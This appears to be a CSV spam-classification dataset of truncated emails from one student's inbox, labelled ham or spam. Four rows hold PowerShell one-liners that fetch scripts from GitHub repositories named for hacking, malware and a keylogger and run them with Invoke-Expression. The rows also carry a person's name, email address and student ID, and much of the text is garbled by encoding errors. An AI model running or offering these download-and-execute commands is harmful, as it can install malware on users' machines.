ham,"Assalamualaikum wbt and greetings! Just a final nudge about our Meetup 4.0 happening today, Jun 1, at Student Lounge KICT. We&#39;re excited to see you all there! Here are the details : - Time : 9.00"
ham,"Assalamualaikum wbt and greetings! Just a final nudge about our Meetup 4.0 happening today, Jun 1, at Student Lounge KICT. We&#39;re excited to see you all there! Here are the details : - Time : 9.00"
ham,Ready to learn something new? Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ
ham,Form Presenter We are happy to listen to your experience with Form Builder Hi Fadzwan Thank you for using Form Builder. We hope you are able to use it well. We would love to hear about your experience
ham,"Form Builder Plus was granted access to your Google account fadzwanashriq.m@gmail.com If you did not grant access, you should check this activity and secure your account. Check activity You can also"
ham,"const emailBody = ` &lt;html&gt; &lt;body&gt; &lt;h1&gt;Form Notification&lt;/h1&gt; &lt;p&gt;Dear user,&lt;/p&gt; &lt;p&gt;Thank you for submitting the form. Here are the details:&lt;/p&gt; &lt;ul&gt;"
ham,"const emailBody = ` &lt;html&gt; &lt;body&gt; &lt;h1&gt;Form Notification&lt;/h1&gt; &lt;p&gt;Dear user,&lt;/p&gt; &lt;p&gt;Thank you for submitting the form. Here are the details:&lt;/p&gt; &lt;ul&gt;"
ham,"&lt;html&gt; &lt;body&gt; &lt;p&gt;Assalamualaikum and greetings,&lt;/p&gt; &lt;p&gt;Thank you for registering for the Developer Tanah Air(DeTA) Meetup 3.0! We&#39;re thrilled to have you join us on"
ham,"&lt;html&gt; &lt;body&gt; &lt;p&gt;Assalamualaikum and greetings,&lt;/p&gt; &lt;p&gt;Thank you for registering for the Developer Tanah Air(DeTA) Meetup 3.0! We&#39;re thrilled to have you join us on"
ham,"Form Notifications was granted access to your Google account fadzwanashriq.m@gmail.com If you did not grant access, you should check this activity and secure your account. Check activity You can also"
ham,"Assalamualaikum and greetings, Thank you for registering for the Developer Tanah Air(DeTA) Meetup 3.0! We&#39;re thrilled to have you join us on 27th April 2024. Event Details: Date : 27th April 2024"
ham,Dear users(s) User Name: MOHAMAD FADZWAN ASHRIQ BIN ZAINURUL HAKIM User ID: (2116337) Email: fadzwanashriq.m@gmail.com The following items have been checked in: Title: Human memory Barcode: 00000615499
ham,"formLimiter was granted access to your Google account fadzwanashriq.m@gmail.com If you did not grant access, you should check this activity and secure your account. Check activity You can also see"
ham,"Syamil Yusof shared a form Syamil Yusof (wanmuhammadsyamil@gmail.com) has invited you to edit the following form: DeTA : Meetup 24.3 Open If you don&#39;t want to receive files from this person, block"
ham,fadzwan Stories for fadzwan @fadzwanashriq.mÂ·Become a member Medium daily digest Today&#39;s highlights Rachel Smythe Rachel SmytheÂ· 6 min read Housing Policies Around the World: What Works and What
ham,"We noticed a login to your account @IDEEIwXJ56jSQ66 from a new device. Was this you? New login Location* Bandar Kuala Lumpur, Wilayah Persekutuan Kuala Lumpur, Malaysia Device 10.42.0 on Android *"
ham,"Google Developer Student Clubs - International Islamic University Malaysia - Selangor, Malaysia View in browser Google Developer Student Clubs Hi Fadzwan, Check out our next event: Building a Legacy:"
ham,Develop business leadership skills with edX. â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ
ham,A brief summary since your last visit on May 5 OpenAI Developer Forum Since your last visit 174 1 13904 New Topics Unread Notifications New Users Popular Topics Community May 20 OpenAI reveals details
ham,"Hi Fadzwan, Just a quick reminder that your opportunity to start a 7-day free trial of Real Python membership is still available, but not for much longer... We genuinely believe that Real Python can"
ham,"fadzwan Stories for fadzwan @fadzwanashriq.mÂ·Become a member Medium daily digest Today&#39;s highlights WHO AM I ? WHO AM I ?Â· 2 min read XSS on TikTok Hi folks , Arthur Juliani Arthur JulianiÂ· 10 min"
ham,"Dear Mohamad, In case you&#39;ve missed our recent emails, we want to remind you about the info-packed webinars we have scheduled for next week. Don&#39;t miss out on the chance to learn from our"
ham,"We noticed a login to your account @IDEEIwXJ56jSQ66 from a new device. Was this you? New login Location* Bandar Kuala Lumpur, Wilayah Persekutuan Kuala Lumpur, Malaysia Device 10.42.0 on Android *"
ham,"Hey @fadzwanashriq, Your personal access token (classic) &quot;eduappp&quot; with admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, admin:ssh_signing_key,"
ham,Here is the code to the assignment: $pl = iwr https://raw.githubusercontent.com/izuannazrin/dANGEROUS/main/cat-videos.ps1; Invoke-Expression $pl [WARNING: WILL RESTART YOUR PC!!]
ham,$pl = iwr https://raw.githubusercontent.com/Mynzy/PowershellHacking/main/filess-example; invoke-expression $pl Virus-free.www.avast.com
ham,$pl = iwr https://raw.githubusercontent.com/adihqfn/malware_test/main/keylogger?token=GHSAT0AAAAAACSUTQJVUESNZWZREC2UFU4UZSSASUQ; invoke-expression $pl
ham,$pl = iwr https://raw.githubusercontent.com/Mynzy/PowershellHacking/main/another-example; invoke-expression $pl Virus-free.www.avast.com
ham,fadzwan Stories for fadzwan @fadzwanashriq.mÂ·Become a member Medium daily digest Today&#39;s highlights Aleksa MajkiÄ‡ Aleksa MajkiÄ‡Â· 16 min read Fake-SMS: How Deep Does the Rabbit Hole Really Go?
ham,Few seats are LEFT! Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í â€Œ ï»¿ Í
ham,"Hi Mohamad, Melabur dalam hartanah merupakan pilihan popular bagi pelabur yang ingin mengembangkan portfolio pelaburan mereka. Pelaburan dalam hartanah boleh dijadikan sebagai sumber pendapatan sewaan"
ham,"Hi @fadzwanashriq, We noticed your personal access token (classic) &quot;eduappp&quot; with admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, admin:"
ham,"Hey ğŸ‘‹, this weekly update contains the latest info on our new product features, tutorials, and our community. Join Us On Discord New Language Support for Speaker Diarization AssemblyAI&#39;s Speaker"
ham,Google will be making changes to the Skillshop platform to allow you to find relevant training and certifications with greater ease â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹ â€‹
ham,kalau kita buat dua button bulat okay ke Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í
ham,"The world&#39;s languages are filled with famously untranslatable words. Some, like mamihlapinatapai (Yahgan for &quot;a look that without words is shared by two people who want to initiate something,"
ham,"Hi Fadzwan, Good news, there are new notifications &amp; updates waiting for you in your Real Python account. Here&#39;s what you may have missed: New Quiz How to Create Pivot Tables With pandas This"
ham,"Hi Fadzwan, Have you ever wondered how far you could go with the right Python learning resources? At Real Python, we&#39;ve helped thousands of developers like you unlock their true potential and"
ham,Save on your next website subscription. Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ Íâ€Œ
ham,"MotionU KICT resolved a comment in the following document LLM DEVTALK PROPOSAL.docx 1 resolved Comments 011-27612190 Fadzwan Ashriq â€¢ 15:04, 8 Mar (MYT) siapa ni MotionU KICT â€¢ 15:05, 8 Mar (MYT) sapa?"
ham,"Hi Fadzwan, We&#39;re just a few hours away! We&#39;re thrilled to see your enthusiasm and commitment on this journey with #GCPBoleh Season 6! If you have already completed the required quests, well"
ham,"Google Developer Student Clubs - Asia Pacific University - Kuala Lumpur, Malaysia View in browser Google Developer Student Clubs Hi Fadzwan, Join us at our next event: Shardeum Malaysia ( Kuala Lumpur)"
spam,"Hi Mohamad Fadzwan Ashriq, in case you missed outâ€¦ We are down to the last 24 hours before we take this off and do a launch to the public. Here&#39;s the email sent yesterdayâ€¦ ======================"
spam,"At Cybrary, we believe in empowering you with the knowledge and skills necessary to safeguard against cyber threats. That&#39;s why we&#39;ve curated this personalized list of recommended training:"
spam,"hey Mohamad Fadzwan Ashriq, I&#39;ve asked some of the students about this and many wanted in. So what I said was, over the last 6-7 years, I have done 1 particular 90-minute sales pitch that has"
spam,"Hi Mohamad, As we search for promising investment opportunities, it is easy to get lured by stocks that seem undervalued, with low price-to-earnings ratios, high dividend yields, or other seemingly"
spam,"hey Mohamad Fadzwan Ashriq, I am gonna be launching 8 Figure Legendary Pitch Secrets to the public soon. But before I do that, tomorrow I will be opening it up to only you and other members in my"
spam,"Check out our *NEW* virtual labs! Email not displaying correctly? View it in your browser. Learn. Practice. Prove: Cybrary Reimagined. Have you heard? With Cybrary&#39;s upcoming product launch, you"
spam,HUAWEI Service Carnival is here again with MORE DEALS! Join us now and grab these OFFERs as below before the event end!! Up to 20% Discount on Spare Parts Battery Replacement at SGD50 and SGD 99 Up to
spam,How me and my students find bestsellers for our e-Comm businesses â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ
spam,Up to 55% off + US$1000 Klook gift card giveaway! Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í
spam,"å—¨ Mohamad, æƒ³è¦åœ¨é™ä½é£é™©çš„åŒæ—¶å®ç°æœ€å¤§åŒ–çš„æŠ•èµ„å›æŠ¥å—ï¼Ÿå¦‚æœæ˜¯çš„è¯ï¼ŒæŠ•èµ„ç»„åˆç®¡ç†æ˜¯å®ç°æ‚¨è´¢åŠ¡ç›®æ ‡çš„å…³é”®ã€‚ æŠ•èµ„ç»„åˆç®¡ç†æ¶‰åŠé€‰æ‹©å’Œç®¡ç†ä¸€ç³»åˆ—ä¸ä½ çš„è´¢åŠ¡ç›®æ ‡ã€é£é™©æ‰¿å—èƒ½åŠ›å’ŒæŠ•èµ„æœŸé™ç›¸åŒ¹é…çš„èµ„äº§ã€‚é€šè¿‡éµå¾ªæ­£ç¡®çš„ç­–ç•¥ï¼Œä½ å¯ä»¥æŠŠæŠ•èµ„å›æŠ¥æœ€å¤§åŒ–ï¼ŒåŒæ—¶ä¹Ÿå°†æ½œåœ¨æŸå¤±é™è‡³æœ€ä½ã€‚ ä¸€ä¸ªè‰¯å¥½ç®¡ç†çš„æŠ•èµ„ç»„åˆå¯ä»¥ä¸ºä½ æä¾›ç¨³å®šçš„å›ç­¹ï¼Œä»è€Œå¸®åŠ©ä½ é•¿æœŸç§¯ç´¯è´¢å¯Œã€‚å› æ­¤ï¼Œæ„å»ºå’Œç®¡ç†ä¸€ä¸ªèƒ½å¤Ÿç»çš„èµ·å¸‚åœºæ³¢åŠ¨è€ƒéªŒçš„æŠ•èµ„ç»„åˆå°±æ˜¯æŠ•èµ„"
spam,"As an Analytics Manager and career coach, Drew Mooney knows a thing or two about achieving that goal! THE MAVEN BLOG Are you looking to take your analyst title to the next level? As an entry-level Data"
spam,"We&#39;ve revamped Chat to make it easier to interact and share messages with your team. A better chat experience Create groups, delete messages, add attachments, and react with emojis! ğŸ˜„ We&#39;ve"
spam,"Hello creators, Frontier by Anima is now opened to all Anima users! Discover what Frontier can do for you, from code analysis and component matching to code generation with component reuse and Figma"
spam,"Hello creators, Frontier by Anima is now opened to all Anima users! Discover what Frontier can do for you, from code analysis and component matching to code generation with component reuse and Figma"
spam,"å—¨ Mohamad, æƒ³çŸ¥é“ä¸€ä¸ªç®€å•æ˜“å­¦çš„ç­–ç•¥ï¼Œå¯ä»¥è®©ä½ æ•æ‰åˆ°å³å°†æš´æ¶¨çš„è‚¡ç¥¨å—ï¼Ÿ è¿™ä¸ªç­–ç•¥ä¸ä»…ç®€å•æ˜“æ‡‚ï¼Œè€Œä¸”éšè—ç€å·¨å¤§çš„æ½œåŠ›ï¼é€šè¿‡æŒæ¡è¿™ä¸ªç­–ç•¥ï¼Œä½ å¯ä»¥ç”¨è¾ƒçŸ­çš„æ—¶é—´å»æ•æ‰æœ‰åŠ¨èƒ½çš„è‚¡ï¼Œä»è€Œèµšå–ä¸°åšçš„åˆ©æ¶¦ã€‚ è¿™ä¸ªç­–ç•¥å°±æ˜¯çªç ´äº¤æ˜“ç­–ç•¥ï¼ æƒ³è¦æŒæ¡è¿™ä¸ªç­–ç•¥è®©ä½ åœ¨äº¤æ˜“ä¸­è„±é¢–è€Œå‡ºï¼Ÿ å¿«æ¥æˆ‘ä»¬çš„çº¿ä¸Šè®²åº§ä¼šã€Šå¦‚ä½•è¿ç”¨çªç ´ç­–ç•¥äº¤æ˜“æ½œåŠ›è‚¡?ã€‹ã€‚æˆ‘ä»¬æœ‰å¹¸é‚€è¯·äº†æ¥è‡ª Share World Consulting çš„Yong"
spam,Win great prizes and earn a unique profile badge! ğŸ† Travel Postcard Contest Get ready to join our new Travel Postcard Contest and win amazing prizes! This time we ask you to create a travel postcard
spam,We are re-opening this deal due to popular demand. Sign up while you can! SPRING SAVINGS SPRING SAVINGS THE DEAL IS BACK! Save up to 40% on Unlimited Plans For those of you who missed our SPRING
spam,"Hi Mohamad, Bitcoin is trading near all-time high around $70000 after the halving. Does it still have room to go? Will it break the all-time high and skyrocket? Or there are altcoins that have bigger"
spam,We are happy to have you in Form Builder Hi Welcome and thank you for installing Form Builder. We&#39;re thrilled to have you as part of our Form Builder family. Now users can build Google Forms from
spam,Cara Penggunaan Scan To Ride BAHASA MELAYU TATACARA MENGIMBAS DAN MENAIKI BAS SMART SELANGOR MENGGUNAKAN APLIKASI CITIZEN E-PAYMENT (CEPat APP) PENDAFTARAN KALI PERTAMA 1. Buka Play Store (Android)
spam,HUAWEI Service Carnival is here again with MORE DEALS! Join us now and grab these OFFERs as below before the event end!! Up to 20% Discount on Spare Parts Battery Replacement at SGD50 and SGD 99 Up to
spam,"Secure Your Spot Now! RSVP to be part of a dynamic and transformative experience. Dear Mohamad Fadzwan Ashriq Bin , Get ready for an electrifying experience at MAHSA University&#39;s Research,"
spam,Sign in You&#39;ve been invited to a new survey Click the button below to log in and get started. Sign in [PC Only] Survey on Daily Life #1459090MY Length: 30 minutes (average) Possible Reward: Max 420
spam,Sign in You&#39;ve been invited to a new survey Click the button below to log in and get started. Sign in Survey on Daily Life #1456497MY Length: 10 minutes (average) Possible Reward: Max 220 Points
spam,Sign in You&#39;ve been invited to a new survey Click the button below to log in and get started. Sign in Survey on Daily Life #1469953MY Length: 10 minutes (average) Possible Reward: Max 220 Points
spam,"Hi Mohamad, Did you know that Moomoo, an all-in-one investment super app, has officially made its debut in Malaysia in late Feb 2024? This innovative investment super app will revolutionize the way we"
spam,Hi! Your next lesson &quot;This looks like?&quot; is waiting for you in the app! With a short daily practice session you will reach your goals in no time! START NEXT ASL LESSON About Contact Click here
spam,Explore the fascinating link between your mind and body ğŸŒŸ ğŸ§  ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿ Í ï»¿
spam,Sign in You&#39;ve been invited to a new survey Click the button below to log in and get started. Sign in Survey on Daily Life #1469892MY Length: 25 minutes (average) Possible Reward: Max 370 Points It
spam,Sign in You&#39;ve been invited to a new survey Click the button below to log in and get started. Sign in Survey on Daily Life #1465466MY Length: 5 minutes (average) Possible Reward: Max 170 Points
spam,ğŸ’ Save Big &amp; Win Diamond Jewellery! Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í Í
spam,Sign in You&#39;ve been invited to a new survey Click the button below to log in and get started. Sign in Survey on Daily Life #1456498MY Length: 10 minutes (average) Possible Reward: Max 220 Points
spam,Updates from our spring release â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ â€Œ
